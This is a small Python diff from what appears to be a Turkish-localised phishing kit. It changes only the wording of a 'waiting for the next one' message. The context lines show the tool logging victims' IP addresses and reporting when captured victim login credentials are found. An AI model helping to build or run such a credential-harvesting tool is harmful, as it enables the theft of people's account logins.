@@ -1432,7 +1432,7 @@ def waiter():
                 # Just add the ip
                 append(ipdata.split("\n")[0], saved_file)
                 print(f"\n{info2}KAYIT EDİLDİ !! {main_ip}")
-                print(f"\n{info}{blue}SONRAKİNİ BEKLİYORUM{cyan}Çıkmak İçin {red}Ctrl+C{cyan} BASABİLİRSİN")
+                print(f"\n{info}{blue}SONRAKİNİ BEKLİYORUM{cyan}  Çıkmak İçin {red}Ctrl+C{cyan}'ye BASABİLİRSİN")
                 remove(ip_file)
             if isfile(cred_file):
                 print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
